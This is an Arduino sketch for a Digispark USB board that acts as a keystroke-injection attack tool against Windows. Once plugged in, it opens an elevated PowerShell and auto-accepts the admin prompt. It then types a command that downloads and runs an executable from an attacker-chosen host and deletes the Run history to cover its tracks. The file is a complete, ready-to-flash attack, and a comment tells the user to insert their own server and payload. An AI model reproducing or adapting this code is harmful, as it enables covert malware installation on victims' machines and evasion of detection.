#include <Arduino.h>
#include "DigiKeyboard.h"

int blinkPin = 1;
void setup()
{
  pinMode(blinkPin, OUTPUT);
  digitalWrite(blinkPin, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(blinkPin, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  // Clear run command history
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  digitalWrite(blinkPin, HIGH);
  delay(1000);
}

void loop()
{
  digitalWrite(blinkPin, HIGH);
  delay(100);
  digitalWrite(blinkPin, LOW);
  delay(100);
}
